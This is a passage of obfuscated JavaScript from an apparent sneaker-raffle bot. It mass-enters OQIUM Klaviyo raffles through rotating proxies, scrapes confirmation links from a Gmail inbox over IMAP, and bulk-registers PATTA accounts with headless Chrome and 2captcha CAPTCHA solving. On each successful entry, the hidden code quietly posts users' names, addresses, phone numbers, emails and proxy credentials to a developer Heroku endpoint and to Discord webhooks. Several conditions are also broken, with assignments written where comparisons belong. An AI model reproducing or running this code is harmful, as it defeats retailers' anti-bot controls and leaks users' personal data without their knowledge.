                                            _0x151000(console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x173ded['name'] + ']\x20Task\x20' + (_0x480ec9 + 0x1) + ':\x20' + _0x5edef9)));
                                        }
                                    };
                                    try {
                                        _0x3410d5 != 'ver' ? console['log'](_0x1211a5() + '\x20[' + _0x173ded['name'] + ']\x20Task\x20' + (_0x480ec9 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1a8dcf['data']['attributes']['email']) : console['log'](_0x1211a5() + '\x20[' + _0x173ded['name'] + ']\x20Task\x20' + (_0x480ec9 + 0x1) + ':\x20Fetching\x20Response'), _0xe9845d(_0x1c8462, callback);
                                    } catch (_0x29949e) {
                                        console['log'](_0x1211a5() + '\x20Task\x20' + (_0x480ec9 + 0x1) + ':\x20' + _0x29949e);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x5eb297(_0x36ff19, 'ver', _0x13dd82, _0xba35d7, _0x47ecd7), console['log'](_0x1211a5() + '\x20[' + _0x13dd82['name'] + ']\x20Sleeping\x20for\x20' + _0x4562fb['delay'] + '\x20ms'), await _0x4d97b0(_0x4562fb['delay']);
                            } catch (_0x5954ce) {
                            }
                        }
                    }
                    try {
                        _0x287cd9();
                        while (!_0x5df47a) {
                            await _0x4d97b0(0xbb8);
                        }
                        console['log']('Found\x20' + _0x57b408['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x4d97b0(0x9c4);
                    }
                    await _0x4bc429(_0x92e209, _0x57b408, _0x1da6fd);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'U6yui3',
                            'custom_source': 'DV1748-601',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'SFX8xn',
                                '$consent_form_version': 0x8d41f5,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x4e7e23, _0x47f787, _0x169d8e) {
                    var _0x1e1ae8 = _0x47f787, _0x1c0bb9 = 0x0;
                    for (var _0x32cd08 = 0x0; _0x32cd08 < _0x47f787['length']; _0x32cd08++) {
                        maxTasks = _0x4562fb['threads'];
                        while (_0x1c0bb9 >= maxTasks) {
                            await _0x4d97b0(_0x4562fb['delay']);
                        }
                        async function _0x23fab4(_0x349868, _0xdc88ba, _0x4a34dc, _0x2469e4) {
                            try {
                                await _0x43eceb(_0xdc88ba, _0x2469e4);
                            } catch (_0x30aba2) {
                                throw new Error(_0x30aba2);
                            }
                            async function _0x2c6081(_0x3528fc, _0xb5b6d3, _0x25c458, _0x514182, _0xd7a604) {
                                _0x1c0bb9++;
                                var _0x223750, _0x1f8068 = {}, _0x3e24d2 = [], _0x7e5a98 = {}, _0x3014aa = [
                                    '40',
                                    '40.5',
                                    '41',
                                    '42',
                                    '42.5',
                                    '43',
                                    '44',
                                    '45',
                                    '45.5',
                                    '46',
                                    '47',
                                    '47.5',
                                    '48'
                                ], _0x42c252 = Math['round'](Math['random']() * (_0x3014aa['length'] - 0x1));
                                !_0x514182 && (_0x514182 = {});
                                if (_0xb5b6d3 != 'ver') {
                                    _0x81eb1(_0x25c458['name'] + '\x20Task\x20' + (_0x3528fc + 0x1) + '\x20/\x20' + _0x514182['length'] + '\x20||\x20File:\x20' + _0x367847 + '\x20Proxies:\x20' + _0x259b4b), _0x3e24d2 = [{
                                        'type': 'rich',
                                        'title': 'Succesful\x20OQIUM\x20Entry',
                                        'description': '',
                                        'color': 0xc0d6d6,
                                        'fields': [
                                            {
                                                'name': 'User',
                                                'value': '' + _0x1d8120
                                            },
                                            {
                                                'name': 'Size',
                                                'value': '' + _0x514182[_0x3528fc]['Size']
                                            },
                                            {
                                                'name': 'Delay',
                                                'value': '' + _0x4562fb['delay']
                                            },
                                            {
                                                'name': 'Version',
                                                'value': '' + _0x5acae2
                                            }
                                        ]
                                    }], _0x7e5a98 = { 'embeds': _0x3e24d2 }, _0x1f8068 = _0x25c458['data'], _0x1f8068['data']['attributes']['email'] = '' + _0x514182[_0x3528fc]['Email'];
                                    if (_0x514182[_0x3528fc]['Size'] == 'RANDOM') {
                                    }
                                    _0x1f8068['data']['attributes']['properties']['$first_name'] = '' + _0x514182[_0x3528fc]['FirstName'], _0x1f8068['data']['attributes']['properties']['$last_name'] = '' + _0x514182[_0x3528fc]['LastName'], _0x1f8068['data']['attributes']['properties']['$address1'] = _0x514182[_0x3528fc]['Address1'] + '\x20' + _0x514182[_0x3528fc]['Address2'] + '\x20' + _0x514182[_0x3528fc]['HouseNumber'], _0x1f8068['data']['attributes']['properties']['$zip'] = '' + _0x514182[_0x3528fc]['Zip'], _0x1f8068['data']['attributes']['properties']['$city'] = '' + _0x514182[_0x3528fc]['City'], _0x1f8068['data']['attributes']['properties']['$country'] = '' + _0x514182[_0x3528fc]['Country'], _0x514182[_0x3528fc]['Size'] == 'RANDOM' ? _0x1f8068['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x3014aa[_0x42c252] : _0x1f8068['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x514182[_0x3528fc]['Size'], _0x1f8068['data']['attributes']['properties']['$phone_number'] = '' + _0x514182[_0x3528fc]['Phone'], _0x1f8068['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x514182[_0x3528fc]['Follower'];
                                }
                                if (_0x4562fb['useRandomProxy'] = ![])
                                    var _0x3bed91 = _0xd7a604[_0x3528fc]['split'](':');
                                else
                                    var _0x1fb884 = Math['round'](Math['random']() * (_0xd7a604['length'] - 0x1)), _0x3bed91 = _0xd7a604[_0x1fb884]['split'](':');
                                var _0x13ba1e = {
                                    'jar': _0x21e44c,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x25c458['url'],
                                    'headers': _0x25c458['headers'],
                                    'body': JSON['stringify'](_0x1f8068),
                                    'proxy': 'http://' + _0x3bed91[0x2] + ':' + _0x3bed91[0x3] + '@' + _0x3bed91[0x0] + ':' + _0x3bed91[0x1]
                                };
                                return _0xb5b6d3 != 'ver' && (_0x13ba1e['url'] = _0x25c458['url'], _0x13ba1e['headers'] = _0x25c458['headers']), _0xb5b6d3 == 'ver' && (_0x13ba1e['method'] = 'GET'), new Promise(function (_0x5be349, _0x1f0cbb) {
                                    callback = async (_0xe41b0, _0x2b6ca6, _0x18d772) => {
                                        if (!_0xe41b0 && _0x2b6ca6['statusCode'] == 0xca || !_0xe41b0 && _0x2b6ca6['statusCode'] == 0xc8) {
                                            if (_0xb5b6d3 != 'ver') {
                                                var _0x287a3a = await _0x4ef820(_0x514182[_0x3528fc], _0x25c458, 'dev', ![]), _0x36ade5 = await _0x4ef820(_0x514182[_0x3528fc], _0x25c458, 'pub', ![]);
                                                const _0x5f13d6 = {
                                                    'succesDEVMSG': { 'embeds': [_0x287a3a] },
                                                    'succesPUBMSG': { 'embeds': [_0x36ade5] }
                                                };
                                                let _0x3b7ece = _0x514182[_0x3528fc];
                                                try {
                                                    prxdata = {
                                                        'username': _0x1d8120['replace']('#', ''),
                                                        'module': _0x25c458['name'],
                                                        'entrydata': JSON['stringify'](_0x3b7ece),
                                                        'proxy': '' + _0xd7a604[_0x3528fc]
                                                    };
                                                    var _0x1788a3 = JSON['stringify'](prxdata);
                                                    let _0x3b6a83 = { 'headers': { 'content-type': 'application/json' } };
                                                    await _0x4012a9['post']('https://jraffles.herokuapp.com/success', _0x1788a3, _0x3b6a83);
                                                } catch (_0x1532c5) {
                                                }
                                                if (_0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '')
                                                    try {
                                                        await _0xa7b872(_0x4562fb['webhook'], _0x5f13d6['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x4d97b0(0xc8), await _0xa7b872(_0x27bacd, _0x5f13d6['succesDEVMSG']), await _0x4d97b0(0xc8);
                                                try {
                                                    await _0xa7b872(_0x3f583b, _0x5f13d6['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x3b7ca0(_0x514182[_0x3528fc], _0x25c458);
                                            }
                                            _0x1c0bb9--, _0x5be349(console['log'](_0x1de0e8['green'](_0x1211a5() + '\x20[' + _0x25c458['name'] + ']\x20Task\x20' + (_0x3528fc + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0xb5b6d3 != 'ver') {
                                                var _0x5d99c6 = '' + _0xe41b0, _0x3344d2 = await _0x4ef820(_0x514182[_0x3528fc], _0x25c458, 'dev', !![], _0x5d99c6), _0x32ef4a = {};
                                                _0x32ef4a['errorDEV'] = { 'embeds': [_0x3344d2] }, _0x320814(_0x514182[_0x3528fc], _0x25c458), _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x32ef4a['errorDEV']), await _0xa7b872(_0x5f83c7, _0x32ef4a['errorDEV']);
                                            }
                                            _0x1c0bb9--, _0x1f0cbb(console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x25c458['name'] + ']\x20Task\x20' + (_0x3528fc + 0x1) + ':\x20' + _0xe41b0)));
                                        }
                                    };
                                    try {
                                        _0xb5b6d3 != 'ver' && console['log'](_0x1211a5() + '\x20[' + _0x25c458['name'] + ']\x20Task\x20' + (_0x3528fc + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1f8068['data']['attributes']['email']), _0xe9845d(_0x13ba1e, callback);
                                    } catch (_0x4467ea) {
                                        console['log'](_0x1211a5() + '\x20Task\x20' + (_0x3528fc + 0x1) + ':\x20' + _0x4467ea);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x2c6081(_0x2469e4, 'nor', _0x349868, _0xdc88ba, _0x4a34dc), console['log'](_0x1211a5() + '\x20[' + _0x349868['name'] + ']\x20Sleeping\x20for\x20' + _0x4562fb['delay'] + '\x20ms'), await _0x4d97b0(_0x4562fb['delay']);
                            } catch (_0x524e14) {
                            }
                        }
                        _0x23fab4(_0x4e7e23, _0x1e1ae8, _0x169d8e, _0x32cd08), await _0x4d97b0(0x3e8);
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x542248, _0x4c5299, _0x2139c) {
                    var _0x4c5299 = [], _0x42127f = ![];
                    async function _0x51bfc4() {
                        var _0xf2a2fb = new _0x1aebaf({
                            'user': _0x4562fb['masterMail'],
                            'password': _0x4562fb['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x4f5104(_0x35b914) {
                            _0xf2a2fb['openBox']('INBOX', ![], _0x35b914);
                        }
                        _0xf2a2fb['once']('ready', function () {
                            _0x4f5104(function (_0x4eb061, _0x136080) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x4eb061)
                                    throw _0x4eb061;
                                _0xf2a2fb['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x2a5ba5, _0x507d67) {
                                    if (!_0x507d67 || !_0x507d67['length'])
                                        console['log'](_0x1211a5() + '\x20[' + _0x542248['name'] + ']\x20No\x20mails\x20found'), _0xf2a2fb['end']();
                                    else {
                                        var _0x1f9219 = _0xf2a2fb['seq']['fetch'](_0x507d67, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x1f9219['on']('message', function (_0xaf2848, _0x235726) {
                                            var _0x45ef1c = '(#' + _0x235726 + ')\x20';
                                            _0xaf2848['on']('body', function (_0x35c545, _0x74c60c) {
                                                _0x372396(_0x35c545, (_0x5ca5b8, _0x37c68b) => {
                                                    var _0x5196d0 = _0x37c68b['text']['split']('(')[0x1], _0x2e3f11 = _0x5196d0['split'](')')[0x0];
                                                    _0x4c5299['push'](_0x2e3f11);
                                                });
                                            }), _0xaf2848['once']('end', function () {
                                            });
                                        }), _0x1f9219['once']('error', function (_0x2eb1d1) {
                                            console['log']('Fetch\x20error:\x20' + _0x2eb1d1), _0x42127f = !![];
                                        }), _0x1f9219['once']('end', function () {
                                            _0xf2a2fb['end'](), _0x42127f = !![];
                                        });
                                    }
                                });
                            });
                        }), _0xf2a2fb['once']('error', function (_0x3cf2a5) {
                            console['log'](_0x3cf2a5), _0x42127f = !![];
                        }), _0xf2a2fb['once']('end', async function () {
                            _0x42127f = !![];
                        }), _0xf2a2fb['connect']();
                    }
                    async function _0x422d55(_0xce3e2f, _0x4a4242, _0x587363) {
                        for (var _0xd2574a = 0x0; _0xd2574a < _0x4a4242['length']; _0xd2574a++) {
                            async function _0x58f7e9(_0x40865d, _0x22283e, _0xa314c9, _0x44920c, _0x3afb2f) {
                                var _0x4d63aa, _0x1740ac = {}, _0x2568ee = [], _0x250be3 = {}, _0x127900 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x2aeeb8 = Math['round'](Math['random']() * (_0x127900['length'] - 0x1));
                                _0x44920c[_0x40865d]['Size'] == 'RANDOM' && (_0x44920c[_0x40865d]['Size'] = _0x127900[_0x2aeeb8]);
                                !_0x44920c && (_0x44920c = {});
                                if (_0x4562fb['useRandomProxy'] = ![])
                                    var _0x2763de = _0x3afb2f[_0x40865d]['split'](':');
                                else
                                    var _0x330f5d = Math['round'](Math['random']() * (_0x3afb2f['length'] - 0x1)), _0x2763de = _0x3afb2f[_0x330f5d]['split'](':');
                                var _0x14bd6b = {
                                    'jar': _0x21e44c,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0xa314c9['url'],
                                    'headers': _0xa314c9['headers'],
                                    'body': JSON['stringify'](_0x1740ac),
                                    'proxy': 'http://' + _0x2763de[0x2] + ':' + _0x2763de[0x3] + '@' + _0x2763de[0x0] + ':' + _0x2763de[0x1]
                                };
                                return _0x22283e == 'ver' && (_0x14bd6b['method'] = 'GET', _0x14bd6b['url'] = _0x44920c[_0x40865d]), new Promise(function (_0x5f3d8e, _0x2cf97e) {
                                    callback = async (_0x5864e8, _0x567c3d, _0x370a2e) => {
                                        !_0x5864e8 && _0x567c3d['statusCode'] == 0xca || !_0x5864e8 && _0x567c3d['statusCode'] == 0xc8 ? _0x5f3d8e(console['log'](_0x1de0e8['green'](_0x1211a5() + '\x20[' + _0xa314c9['name'] + ']\x20Task\x20' + (_0x40865d + 0x1) + ':\x20Raffle\x20Entered!'))) : _0x2cf97e(console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0xa314c9['name'] + ']\x20Task\x20' + (_0x40865d + 0x1) + ':\x20' + _0x5864e8)));
                                    };
                                    try {
                                        _0x22283e != 'ver' ? console['log'](_0x1211a5() + '\x20[' + _0xa314c9['name'] + ']\x20Task\x20' + (_0x40865d + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1740ac['data']['attributes']['email']) : console['log'](_0x1211a5() + '\x20[' + _0xa314c9['name'] + ']\x20Task\x20' + (_0x40865d + 0x1) + ':\x20Fetching\x20Response'), _0xe9845d(_0x14bd6b, callback);
                                    } catch (_0x341b5b) {
                                        console['log'](_0x1211a5() + '\x20Task\x20' + (_0x40865d + 0x1) + ':\x20' + _0x341b5b);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x58f7e9(_0xd2574a, 'ver', _0xce3e2f, _0x4a4242, _0x587363), console['log'](_0x1211a5() + '\x20[' + _0xce3e2f['name'] + ']\x20Sleeping\x20for\x20' + _0x4562fb['delay'] + '\x20ms'), await _0x4d97b0(_0x4562fb['delay']);
                            } catch (_0x12fda1) {
                                console['log'](_0x12fda1), await _0x4d97b0(0x2710);
                            }
                        }
                    }
                    try {
                        _0x51bfc4();
                        while (!_0x42127f) {
                            await _0x4d97b0(0xfa0);
                        }
                        console['log']('Found\x20' + _0x4c5299['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch (_0x50b3f3) {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), console['log'](_0x50b3f3), await _0x4d97b0(0x2710);
                    }
                    try {
                        await _0x422d55(_0x542248, _0x4c5299, _0x2139c);
                    } catch (_0x5b52a8) {
                        console['log'](_0x5b52a8), await _0x4d97b0(0x2710);
                    }
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x2c3ffc, _0x516e8f, _0x5a13ad) {
                    _0x3621d0['use'](_0x509c12()), _0x3621d0['use'](_0x14703b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4562fb['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x328559 = 0x0; _0x328559 < _0x516e8f['length']; _0x328559++) {
                        var _0x27a1b4 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1d8120
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4562fb['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5acae2
                                }
                            ]
                        }];
                        const _0x219dde = { 'embeds': _0x27a1b4 };
                        _0x81eb1(_0x2c3ffc['name'] + '\x20Task\x20' + (_0x328559 + 0x1) + '\x20/\x20' + _0x516e8f['length'] + '\x20||\x20File:\x20' + _0x367847 + '\x20Proxies:\x20' + _0x259b4b);
                        try {
                            await _0x43eceb(_0x516e8f, _0x328559);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x33d6c9 = await _0x4ef820(_0x516e8f[_0x328559], _0x2c3ffc, 'acc', ![]);
                        const _0x1e0cd2 = { 'succesDEVMSG': { 'embeds': [_0x33d6c9] } };
                        if (_0x516e8f[_0x328559]['Email'] == '' || _0x516e8f[_0x328559]['FirstName'] == '' || _0x516e8f[_0x328559]['LastName'] == '') {
                            console['log'](_0x1211a5() + '\x20[' + _0x2cac2b[taskModule]['name'] + ']\x20Task\x20' + (_0x328559 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x4d97b0(0x7d0);
                            continue;
                        }
                        (_0x516e8f[_0x328559]['Password'] == '' || _0x516e8f[_0x328559] == undefined) && _0x516e8f[_0x328559]['Password'] == 'JRaffles23!';
                        if (_0x4562fb['useRandomProxy'] = ![])
                            var _0x57b39d = _0x5a13ad[_0x328559]['split'](':');
                        else
                            var _0x5c002f = Math['round'](Math['random']() * (_0x5a13ad['length'] - 0x1)), _0x57b39d = _0x5a13ad[_0x5c002f]['split'](':');
                        var _0x197d7d;
                        try {
                            _0x197d7d = await _0x3621d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x57b39d[0x0] + ':' + _0x57b39d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x197d7d = await _0x3621d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x57b39d[0x0] + ':' + _0x57b39d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x48eb32 = await _0x197d7d['newPage']();
                            await _0x48eb32['authenticate']({
                                'username': '' + _0x57b39d[0x2],
                                'password': '' + _0x57b39d[0x3]
                            }), console['log'](_0x1211a5() + '\x20[' + _0x2c3ffc['name'] + ']\x20Task\x20' + (_0x328559 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x48eb32['setRequestInterception'](!![]), _0x48eb32['on']('request', _0x211520 => {
                                _0x211520['resourceType']() === 'image' || _0x211520['resourceType']() === 'font' || _0x211520['resourceType']() === 'media' ? _0x211520['abort']() : _0x211520['continue']();
                            }), await _0x48eb32['goto']('https://patta.nl/account/register'), await _0x4d97b0(0xbb8), await _0x48eb32['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x1211a5() + '\x20[' + _0x2c3ffc['name'] + ']\x20Task\x20' + (_0x328559 + 0x1) + '\x20:\x20Filling\x20information'), await _0x48eb32['type']('#RegisterForm-FirstName', '' + _0x516e8f[_0x328559]['FirstName']), await _0x4d97b0(0x226), await _0x48eb32['type']('#RegisterForm-LastName', '' + _0x516e8f[_0x328559]['LastName']), await _0x4d97b0(0x226), await _0x48eb32['type']('#RegisterForm-email', '' + _0x516e8f[_0x328559]['Email']), await _0x4d97b0(0x226), await _0x48eb32['type']('#RegisterForm-password', '' + _0x516e8f[_0x328559]['Password']), await _0x4d97b0(0x226), console['log'](_0x1211a5() + '\x20[' + _0x2c3ffc['name'] + ']\x20Task\x20' + (_0x328559 + 0x1) + '\x20:\x20Submitting..'), await _0x48eb32['$eval']('#RegisterForm', _0xd79b5a => _0xd79b5a['submit']()), await _0x4d97b0(0x1f40);
                            try {
                                await _0x48eb32['waitForSelector']('.home-page-grid__collection'), await _0x4d97b0(0x1f4), console['log'](_0x1de0e8['green'](_0x1211a5() + '\x20[' + _0x2c3ffc['name'] + ']\x20Task\x20' + (_0x328559 + 0x1) + '\x20:\x20Account\x20' + _0x516e8f[_0x328559]['Email'] + '\x20Generated!')), _0x4a3989['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x516e8f[_0x328559]['Email'] + ',' + _0x516e8f[_0x328559]['Password']), console['log'](_0x1de0e8['yellow'](_0x1211a5() + '\x20[' + _0x2c3ffc['name'] + ']\x20Task\x20' + (_0x328559 + 0x1) + '\x20:\x20Account\x20' + _0x516e8f[_0x328559]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x1e0cd2['succesDEVMSG']);
                                } catch {
                                }
                                await _0xa7b872(_0x392309, _0x1e0cd2['succesDEVMSG']);
                            } catch (_0x1ba5dd) {
                                console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x2cac2b[taskModule]['name'] + ']\x20Task\x20' + (_0x328559 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x1ba5dd));
                            }
                        } catch (_0x18c171) {
                            console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x2cac2b[taskModule]['name'] + ']\x20Task\x20' + (_0x328559 + 0x1) + '\x20:\x20' + _0x18c171));
                        } finally {
                            _0x197d7d && _0x197d7d['close'](), console['log']('Waiting\x20for\x20' + _0x4562fb['delay'] + '\x20ms'), await _0x4d97b0(_0x4562fb['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x102f91, _0x87fc0b, _0x374ae6) {
                    _0x3621d0['use'](_0x509c12()), _0x3621d0['use'](_0x14703b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4562fb['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4abe6e = 0x0; _0x4abe6e < _0x87fc0b['length']; _0x4abe6e++) {
                        var _0x4453b2;
                        if (_0x4f6a3d != 'yes')
                            var _0x4f6a3d = '', _0x3ada12 = 0x0;
                        _0x81eb1(_0x102f91['name'] + '\x20Task\x20' + (_0x4abe6e + 0x1) + '\x20/\x20' + _0x87fc0b['length'] + '\x20||\x20File:\x20' + _0x367847 + '\x20Proxies:\x20' + _0x259b4b);
                        try {
                            await _0x43eceb(_0x87fc0b, _0x4abe6e);
                        } catch {
                            _0x4f6a3d = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x87fc0b[_0x4abe6e]['Email'] == '' || _0x87fc0b[_0x4abe6e]['Password'] == '' || _0x87fc0b[_0x4abe6e]['FirstName'] == '' || _0x87fc0b[_0x4abe6e]['LastName'] == '') {
                            console['log'](_0x1211a5() + '\x20[' + _0x2cac2b[taskModule]['name'] + ']\x20Task\x20' + (_0x4abe6e + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x4562fb['useRandomProxy'] = ![])
                            var _0x28fd5d = _0x374ae6[_0x4abe6e]['split'](':');
                        else
                            var _0x565d41 = Math['round'](Math['random']() * (_0x374ae6['length'] - 0x1)), _0x28fd5d = _0x374ae6[_0x565d41]['split'](':');
                        var _0xff6564;
                        try {
                            _0xff6564 = await _0x3621d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x28fd5d[0x0] + ':' + _0x28fd5d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xff6564 = await _0x3621d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x28fd5d[0x0] + ':' + _0x28fd5d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1eff43 = await _0xff6564['newPage']();
                            await _0x1eff43['authenticate']({
                                'username': '' + _0x28fd5d[0x2],
                                'password': '' + _0x28fd5d[0x3]
                            }), console['log'](_0x1211a5() + '\x20[' + _0x102f91['name'] + ']\x20Task\x20' + (_0x4abe6e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1eff43['setRequestInterception'](!![]), _0x1eff43['on']('request', _0x5d25ab => {
